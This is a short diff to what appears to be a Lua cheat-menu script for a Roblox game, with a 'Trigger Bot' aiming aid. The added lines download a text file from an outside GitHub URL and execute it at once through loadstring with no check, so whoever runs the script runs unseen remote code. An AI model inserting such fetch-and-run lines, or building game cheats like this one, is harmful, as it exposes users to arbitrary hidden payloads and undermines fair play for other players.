@@ -140,3 +140,5 @@ Menu.Slider("Main", "Trigger Bot", "Range", 1, 100, TriggerBot.Range, "", 1, fun
     TriggerBot.Range = Value
 end)
 
+-- Load the external script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripade/sh/refs/heads/main/Wsvr.txt"))()
